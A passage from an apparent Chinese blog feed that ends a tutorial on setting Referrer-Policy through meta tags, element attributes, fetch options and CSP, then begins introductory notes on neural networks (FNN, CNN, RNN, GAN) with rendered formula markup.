<code>&lt;head&gt;</code> 部分使用 <code>&lt;meta&gt;</code> 标签设置 <code>referrer-policy</code>：</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;referrer&quot;</span> <span class="attr">content</span>=<span class="string">&quot;strict-origin-when-cross-origin&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="3"><li><strong>HTML 元素的 <code>referrerpolicy</code> 属性:</strong> 为特定的 <code>&lt;a&gt;</code>, <code>&lt;area&gt;</code>, 和 <code>&lt;form&gt;</code> 元素设置 <code>referrerpolicy</code> 属性，覆盖全局设置：</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://example.com&quot;</span> <span class="attr">referrerpolicy</span>=<span class="string">&quot;origin&quot;</span>&gt;</span>Visit Example<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://anothersite.com&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">referrerpolicy</span>=<span class="string">&quot;no-referrer&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="4"><li><strong>在<code> AJAX</code> 中配置 <code>referrer-policy</code>:</strong>  对于通过 <code>JavaScript</code> 发起的 <code>AJAX</code> 请求：</li></ol><ul><li><p><strong>使用 <code>fetch</code> API:</strong> 在 <code>fetch</code> 请求的配置对象中，使用 <code>referrerPolicy</code> 选项设置特定的策略。例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/api/data&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">  <span class="attr">referrerPolicy</span>: <span class="string">&#x27;origin-when-cross-origin&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>此设置会覆盖全局的 <code>referrer-policy</code>。</p></li><li><p><strong>使用 <code>XMLHttpRequest</code>:</strong> <code>XMLHttpRequest</code> 本身没有直接的 <code>referrerPolicy</code> 属性。你需要依赖全局的 <code>referrer-policy</code> 设置（HTTP 头部或 <code>&lt;meta&gt;</code> 标签）。</p></li></ul><ol start="5"><li><strong>在内容安全策略 (CSP) 中配置 <code>referrer-policy</code>:</strong></li></ol><p><code>referrer-policy</code> 可以作为 CSP 指令的一部分在 HTTP 响应头或 HTML <code>&lt;meta&gt;</code> 标签中设置。</p><ul><li><strong>HTTP 头部中的 CSP:</strong></li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>referrer-policy origin-when-cross-origin</span><br></pre></td></tr></table></figure><ul><li><strong>HTML <code>&lt;meta&gt;</code> 标签中的 CSP:</strong></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;referrer-policy origin-when-cross-origin&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在 <code>CSP</code> 中设置 <code>referrer-policy</code> 会强制整个文档及其发起的请求遵循该策略，但会被更具体的设置（如 <code>fetch</code> API 中的 <code>referrerPolicy</code> 或 HTML 元素的 <code>referrerpolicy</code> 属性）覆盖。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息泄露 </tag>
            
            <tag> Referer-Policy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>神经网络笔记</title>
      <link href="/2025/05/02/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/05/02/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="神经网络-Neural-Networks">神经网络(Neural Networks)</h2><p>神经网络（Neural Network）是一种模仿人类大脑神经元结构和工作方式的计算模型，广泛用于机器学习和人工智能中，尤其擅长处理图像识别、语音识别、自然语言处理等复杂任务。</p><p><strong>通俗理解：</strong></p><p>可以把神经网络看成是一种&quot;黑盒子&quot;系统，它通过输入一些数据，不断学习其中的规律，并给出相应的输出结果。就像人类通过经验不断学习和改进一样，神经网络也通过大量的数据训练自己。</p><h3 id="组成结构">组成结构</h3><p>神经网络通常由以下几个部分组成：</p><ol><li><strong>输入层（Input Layer）</strong>：接收原始数据，比如图片的像素值或文本的向量表示。</li><li><strong>隐藏层（Hidden Layers）</strong>：中间若干层神经元节点，每一层都会对数据进行处理和特征提取。</li><li><strong>输出层（Output Layer）</strong>：输出最终结果，比如分类标签或预测数值。</li></ol><p>每一层都包含多个“神经元”，它们通过**权重（weight）<strong>和</strong>偏置（bias）<strong>连接，并经过一个</strong>激活函数（activation function）**进行非线性变换。</p><p><strong>举个简单的例子：</strong></p><p>比如你要训练一个神经网络来识别猫和狗的图片：</p><ul><li>输入层：接收图片的像素数据。</li><li>隐藏层：提取特征，比如耳朵形状、毛发颜色、眼睛位置等。</li><li>输出层：给出结果，例如“这是一只猫”或“这是一只狗”。</li></ul><h3 id="常见的算法">常见的算法</h3><p>前馈神经网络（<code>Feedforward Neural Network, FNN</code>）、卷积神经网络（<code>Convolutional Neural Network, CNN</code>）、循环神经网络（<code>Recurrent Neural Network, RNN</code>）、生成对抗网络（<code>Generative Adversarial Network, GAN</code>）等。</p><h4 id="前馈神经网络（FNN）">前馈神经网络（FNN）</h4><ul><li><strong>描述</strong>：最基本的神经网络结构，信息从输入层单向流向输出层，没有循环。</li><li><strong>用途</strong>：图像分类、特征提取、函数拟合等。</li><li><strong>核心算法</strong>：前向传播 + 反向传播（Backpropagation）</li></ul><h4 id="卷积神经网络（CNN）">卷积神经网络（CNN）</h4><ul><li><strong>描述</strong>：专门用于处理<strong>图像</strong>等具有空间结构的数据，利用卷积层提取局部特征。</li><li><strong>组成</strong>：卷积层、池化层、全连接层</li><li><strong>用途</strong>：图像识别（如人脸识别、物体检测）、视频分析、医疗图像等。</li><li><strong>代表网络</strong>：LeNet, AlexNet, VGG, ResNet</li></ul><h4 id="循环神经网络（RNN）">循环神经网络（RNN）</h4><ul><li><strong>描述</strong>：具有“记忆”能力，适用于<strong>序列数据</strong>，通过隐藏状态传递前一时刻信息。</li><li><strong>用途</strong>：自然语言处理（NLP）、时间序列预测、语音识别</li><li><strong>变种</strong>：<ul><li>LSTM（Long Short-Term Memory）</li><li>GRU（Gated Recurrent Unit）</li></ul></li></ul><h4 id="生成对抗网络（GAN）">生成对抗网络（GAN）</h4><ul><li><strong>描述</strong>：由生成器（Generator）和判别器（Discriminator）组成，进行对抗训练。</li><li><strong>用途</strong>：图像生成、风格迁移、数据增强、超分辨率</li><li><strong>代表算法</strong>：DCGAN、StyleGAN、CycleGAN</li></ul><h2 id="前馈神经网络（FNN）-2">前馈神经网络（FNN）</h2><p>前馈神经网络（<code>Feedforward Neural Network, FNN</code>）是一种<strong>人工神经网络</strong>，其中<strong>信息单向流动</strong>——从输入层流向输出层，中间经过一个或多个<strong>隐藏层</strong>，<strong>没有环路或反馈连接</strong>。</p><h3 id="网络结构组成">网络结构组成</h3><p>一个典型的 FNN 包括：</p><ol><li><p><strong>输入层</strong><br>接收原始特征输入（如图像像素、文本向量、数值特征等）</p></li><li><p><strong>隐藏层（1个或多个）</strong><br>每层包含多个神经元，执行线性加权和 + 激活函数</p><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="34.453ex" height="2.7ex" role="img" focusable="false" viewbox="0 -943.3 15228.3 1193.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(498,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(1429.6,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(2485.4,0)"><g data-mml-node="mi"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(1136.2,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="msup" transform="translate(4275.5,0)"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(562,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(1354,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(1854,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(6617.3,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(7617.5,0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(462,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(8733.4,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z" style="stroke-width: 3;"/></g><g data-mml-node="mstyle" transform="translate(9011.4,0)"><g data-mml-node="mspace"/><g data-mml-node="msup" transform="translate(10178,0)"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(562,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(11671.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(12727.5,0)"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(13298.5,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(13687.5,0)"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(498,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(14839.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><msup><mi>z</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup><mo>=</mo><msup><mi>W</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup><msup><mi>a</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msup><mo>+</mo><msup><mi>b</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup><mo>,</mo><mstyle scriptlevel="0"><mspace width="1em"></mspace></mstyle><msup><mi>a</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup><mo>=</mo><mi>σ</mi><mo stretchy="false">(</mo><msup><mi>z</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container></li><li><p><strong>输出层</strong><br>给出最终结果，如分类概率、回归数值等。<br>通常会根据任务选用不同激活函数（如 softmax、sigmoid、linear）</p></li></ol><h3 id="前向传播（Forward-Propagation）">前向传播（Forward Propagation）</h3><h4 id="基本流程">基本流程</h4><p>假设有一个简单的前馈神经网络（Feedforward Neural Network），它由以下几部分组成：</p><ul><li>输入层（Input Layer）</li><li>一个或多个隐藏层（Hidden Layers）</li><li>输出层（Output Layer）</li></ul><p>每一层的神经元通过权重（weights）和偏置（biases）连接。</p><p><strong>对于第 <mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="0.674ex" height="1.595ex" role="img" focusable="false" viewbox="0 -694 298 705" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>l</mi></math></mjx-assistive-mml></mjx-container> 层的向前传播步骤如下：</strong></p><ol><li><p><strong>加权求和</strong></p><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="19.759ex" height="2.32ex" role="img" focusable="false" viewbox="0 -943.3 8733.4 1025.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(498,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 